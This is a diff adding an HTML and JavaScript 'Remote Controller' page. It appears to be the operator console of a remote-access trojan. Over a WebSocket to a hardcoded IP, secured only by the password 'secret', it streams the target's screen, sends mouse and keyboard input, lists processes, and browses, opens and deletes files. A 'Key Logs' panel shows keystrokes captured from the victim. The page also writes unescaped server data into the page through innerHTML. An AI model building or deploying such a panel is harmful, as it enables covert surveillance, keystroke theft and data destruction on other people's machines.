@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Remote Controller</title>
+  <style>
+    /* CSS Variables for dark theme */
+    :root {
+      --bg-color: #121212;
+      --primary-color: #1e1e1e;
+      --secondary-color: #2c2c2c;
+      --accent-color: #009688;
+      --text-color: #e0e0e0;
+      --border-color: #333;
+      --shadow-color: rgba(0, 0, 0, 0.6);
+      --hover-color: #00796b;
+      --header-footer-bg: #1a1a1a;
+    }
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+    }
+    header {
+      background-color: var(--header-footer-bg);
+      padding: 20px;
+      text-align: center;
+      font-size: 1.8em;
+      border-bottom: 2px solid var(--border-color);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    #status {
+      text-align: center;
+      padding: 10px;
+      background-color: var(--primary-color);
+      border-bottom: 1px solid var(--border-color);
+      font-weight: bold;
+    }
+    #main {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      padding: 20px;
+      gap: 20px;
+    }
+    #streamContainer, #controlContainer, #infoContainer {
+      background-color: var(--secondary-color);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px var(--shadow-color);
+    }
+    #streamContainer {
+      flex: 2 1 600px;
+      text-align: center;
+    }
+    #streamContainer img {
+      max-width: 100%;
+      border: 3px solid var(--border-color);
+      border-radius: 5px;
+    }
+    #controlContainer, #infoContainer {
+      flex: 1 1 300px;
+      max-width: 400px;
+    }
+    h2 {
+      border-bottom: 2px solid var(--border-color);
+      padding-bottom: 10px;
+      margin-bottom: 15px;
+      font-size: 1.5em;
+    }
+    .section {
+      margin-bottom: 20px;
+    }
+    .section h3 {
+      margin-bottom: 10px;
+      font-size: 1.2em;
+    }
+    .control-btn {
+      background-color: var(--accent-color);
+      border: none;
+      color: var(--text-color);
+      padding: 10px 15px;
+      margin: 5px;
+      font-size: 1em;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+    .control-btn:hover {
+      background-color: var(--hover-color);
+      transform: translateY(-2px);
+    }
+    input[type="text"],
+    input[type="number"],
+    textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 1em;
+      border: none;
+      border-radius: 5px;
+      background-color: var(--primary-color);
+      color: var(--text-color);
+    }
+    textarea {
+      resize: vertical;
+    }
+    ul {
+      list-style-type: none;
+      padding: 0;
+    }
+    li {
+      margin: 5px 0;
+      padding: 5px;
+      background-color: var(--primary-color);
+      border-radius: 3px;
+    }
+    .file-item button {
+      margin-left: 5px;
+    }
+    footer {
+      background-color: var(--header-footer-bg);
+      color: #bbb;
+      text-align: center;
+      padding: 15px;
+      border-top: 2px solid var(--border-color);
+      position: fixed;
+      width: 100%;
+      bottom: 0;
+    }
+    /* Monitor icon styles */
+    .monitor-icon {
+      width: 80px;
+      height: 60px;
+      object-fit: cover;
+      margin: 5px;
+      cursor: pointer;
+      border: 2px solid transparent;
+      border-radius: 5px;
+      transition: border-color 0.3s ease;
+    }
+    .monitor-icon:hover {
+      border-color: var(--accent-color);
+    }
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+      #main {
+        flex-direction: column;
+        align-items: center;
+      }
+      #streamContainer, #controlContainer, #infoContainer {
+        max-width: 90%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>Remote Controller</header>
+  <div id="status">Connecting...</div>
+  <div id="main">
+    <div id="streamContainer">
+      <h2>Remote Desktop</h2>
+      <img id="screen" src="" alt="Awaiting stream..." />
+    </div>
+    <div id="controlContainer">
+      <h2>Controls</h2>
+      <div class="section">
+        <h3>Mouse</h3>
+        <button class="control-btn" onclick="sendCommand({command:'mouse_move_rel', dx:0, dy:-50})">↑</button><br>
+        <button class="control-btn" onclick="sendCommand({command:'mouse_move_rel', dx:-50, dy:0})">←</button>
+        <button class="control-btn" onclick="sendCommand({command:'mouse_move_rel', dx:50, dy:0})">→</button><br>
+        <button class="control-btn" onclick="sendCommand({command:'mouse_move_rel', dx:0, dy:50})">↓</button><br>
+        <button class="control-btn" onclick="sendCommand({command:'mouse_click', button:'left'})">Left Click</button>
+        <button class="control-btn" onclick="sendCommand({command:'mouse_click', button:'right'})">Right Click</button>
+      </div>
+      <div class="section">
+        <h3>Keyboard</h3>
+        <input id="keyInput" type="text" placeholder="Type text here" />
+        <button class="control-btn" onclick="sendKeyboard()">Send Text</button>
+      </div>
+      <div class="section">
+        <h3>Scroll</h3>
+        <button class="control-btn" onclick="sendCommand({command:'scroll', amount:100})">Scroll Up</button>
+        <button class="control-btn" onclick="sendCommand({command:'scroll', amount:-100})">Scroll Down</button>
+      </div>
+      <div class="section">
+        <h3>Multi‑Monitor</h3>
+        <button class="control-btn" onclick="sendCommand({command:'list_monitors'})">Refresh Monitor List</button>
+      </div>
+      <div class="section">
+        <h3>File Commands</h3>
+        <input id="fileCmd" type="text" placeholder="e.g., ls, cd .., cd Users, delete file.txt, open file.txt" />
+        <button class="control-btn" onclick="sendFileCmd()">Send File Command</button>
+      </div>
+      <div class="section">
+        <h3>Volume</h3>
+        <input id="volLevel" type="number" placeholder="Volume 0-100" />
+        <button class="control-btn" onclick="sendCommand({command:'set_volume', level: document.getElementById('volLevel').value})">Set Volume</button>
+      </div>
+      <div class="section">
+        <h3>Notifications</h3>
+        <input id="notifyMsg" type="text" placeholder="Notification message" />
+        <button class="control-btn" onclick="sendCommand({command:'notify', message: document.getElementById('notifyMsg').value})">Send Notification</button>
+      </div>
+    </div>
+    <div id="infoContainer">
+      <h2>Info</h2>
+      <div class="section">
+        <h3>System Info</h3>
+        <div id="sysinfo"></div>
+      </div>
+      <div class="section">
+        <h3>Process List</h3>
+        <div id="procinfo"></div>
+      </div>
+      <div class="section">
+        <h3>Directory Listing</h3>
+        <div id="dirinfo"></div>
+      </div>
+      <div class="section">
+        <h3>Key Logs</h3>
+        <div id="keylogs" style="max-height:150px; overflow:auto; background: var(--primary-color); padding:10px; border-radius:5px;"></div>
+      </div>
+      <div class="section">
+        <h3>Monitor List</h3>
+        <div id="monitorList"></div>
+      </div>
+      <div class="section">
+        <h3>Notifications</h3>
+        <div id="notificationArea"></div>
+      </div>
+    </div>
+  </div>
+  <script>
+    let selectedMonitor = null;
+    // Cache the last monitor list data for re-rendering
+    window.lastMonitorData = null;
+    
+    const socket = new WebSocket("ws://109.80.40.13:8765");
+    const statusElem = document.getElementById("status");
+    const screenElem = document.getElementById("screen");
+    const sysinfoElem = document.getElementById("sysinfo");
+    const procinfoElem = document.getElementById("procinfo");
+    const dirinfoElem = document.getElementById("dirinfo");
+    const keylogsElem = document.getElementById("keylogs");
+    const monitorListElem = document.getElementById("monitorList");
+    const notificationAreaElem = document.getElementById("notificationArea");
+
+    socket.onopen = () => {
+      statusElem.textContent = "Authenticating...";
+      socket.send("secret");
+    };
+
+    socket.onmessage = (event) => {
+      try {
+        const msg = JSON.parse(event.data);
+        if (msg.type === "error") {
+          statusElem.textContent = msg.data;
+          socket.close();
+        } else if (msg.type === "info") {
+          statusElem.textContent = msg.data;
+        } else if (msg.type === "screenshot") {
+          screenElem.src = "data:image/jpeg;base64," + msg.data;
+        } else if (msg.type === "keys") {
+          keylogsElem.innerHTML += msg.data;
+        } else if (msg.type === "sysinfo") {
+          sysinfoElem.innerHTML = formatSysInfo(msg.data);
+        } else if (msg.type === "process_list") {
+          procinfoElem.innerHTML = formatProcessList(msg.data);
+        } else if (msg.type === "directory_list") {
+          dirinfoElem.innerHTML = formatDirectoryList(msg.data);
+        } else if (msg.type === "monitor_list") {
+          window.lastMonitorData = msg.data;
+          monitorListElem.innerHTML = formatMonitorList(msg.data);
+        } else if (msg.type === "notification") {
+          notificationAreaElem.innerHTML += `<div>${msg.data}</div>`;
+        }
+      } catch (e) {
+        console.error("Error parsing message:", e);
+      }
+    };
+
+    socket.onerror = (error) => {
+      statusElem.textContent = "WebSocket error occurred.";
+      console.error("WebSocket Error:", error);
+    };
+
+    function sendCommand(commandObj) {
+      if (socket.readyState === WebSocket.OPEN) {
+        const msg = { type: "command", ...commandObj };
+        socket.send(JSON.stringify(msg));
+      }
+    }
+
+    function sendKeyboard() {
+      const input = document.getElementById("keyInput");
+      const text = input.value;
+      if (text.trim() !== "") {
+        sendCommand({ command: "keyboard_input", text: text });
+        input.value = "";
+      }
+    }
+
+    function sendFileCmd() {
+      const cmdInput = document.getElementById("fileCmd");
+      const fileCommand = cmdInput.value;
+      sendCommand({ command: "file_cmd", cmd: fileCommand });
+      cmdInput.value = "";
+    }
+
+    // Updated monitor list formatting to use clickable images
+    function formatMonitorList(data) {
+      let html = "<div style='display: flex; flex-wrap: wrap; justify-content: center;'>";
+      data.forEach(mon => {
+        const imgSrc = (selectedMonitor === mon.index) ? "select-monitor.png" : "monitor.png";
+        html += `<img class="monitor-icon" src="${imgSrc}" alt="Monitor ${mon.index}" onclick="selectMonitorByIndex(${mon.index})" title="Monitor ${mon.index} (${mon.width}x${mon.height})">`;
+      });
+      html += "</div>";
+      return html;
+    }
+
+    function selectMonitorByIndex(index) {
+      sendCommand({ command: "select_monitor", index: index });
+      selectedMonitor = index;
+      // Refresh monitor list display with the updated selection
+      if (window.lastMonitorData) {
+        monitorListElem.innerHTML = formatMonitorList(window.lastMonitorData);
+      }
+    }
+
+    function formatDirectoryList(data) {
+      let html = "<ul>";
+      data.forEach(item => {
+        if (item.is_dir) {
+          html += `<li>${item.name} (DIR)
+            <button class="control-btn" onclick="sendFileCmdAction('cd', '${item.name}')">cd</button>
+            <button class="control-btn" onclick="sendFileCmdAction('delete', '${item.name}')">delete</button>
+          </li>`;
+        } else {
+          html += `<li>${item.name}
+            <button class="control-btn" onclick="sendFileCmdAction('open', '${item.name}')">open</button>
+            <button class="control-btn" onclick="sendFileCmdAction('delete', '${item.name}')">delete</button>
+          </li>`;
+        }
+      });
+      html += "</ul>";
+      return html;
+    }
+
+    function sendFileCmdAction(action, filename) {
+      let cmdStr = "";
+      if (action === "cd") {
+        cmdStr = "cd " + filename;
+      } else if (action === "delete") {
+        cmdStr = "delete " + filename;
+      } else if (action === "open") {
+        cmdStr = "open " + filename;
+      }
+      sendCommand({ command: "file_cmd", cmd: cmdStr });
+    }
+
+    function formatSysInfo(data) {
+      return `<strong>OS:</strong> ${data.os} ${data.os_release}<br>
+              <strong>CPU:</strong> ${data.cpu_percent}%<br>
+              <strong>Memory:</strong><br>
+              &nbsp;&nbsp;Total: ${(data.memory.total/1e9).toFixed(2)} GB<br>
+              &nbsp;&nbsp;Used: ${(data.memory.used/1e9).toFixed(2)} GB (${data.memory.percent}%)<br>
+              &nbsp;&nbsp;Free: ${(data.memory.available/1e9).toFixed(2)} GB<br>
+              <strong>Disk:</strong><br>
+              &nbsp;&nbsp;Total: ${(data.disk.total/1e9).toFixed(2)} GB<br>
+              &nbsp;&nbsp;Used: ${(data.disk.used/1e9).toFixed(2)} GB (${data.disk.percent}%)<br>
+              &nbsp;&nbsp;Free: ${(data.disk.free/1e9).toFixed(2)} GB`;
+    }
+
+    function formatProcessList(data) {
+      let html = "<ul>";
+      data.forEach(proc => {
+        html += `<li>${proc.pid}: ${proc.name}</li>`;
+      });
+      html += "</ul>";
+      return html;
+    }
+
+    // Prevent key events from interfering with input fields
+    document.addEventListener("keydown", function(e) {
+      if (e.target.tagName !== "INPUT" && e.target.tagName !== "TEXTAREA") {
+        e.preventDefault();
+      }
+    });
+  </script>
+</body>
+</html>
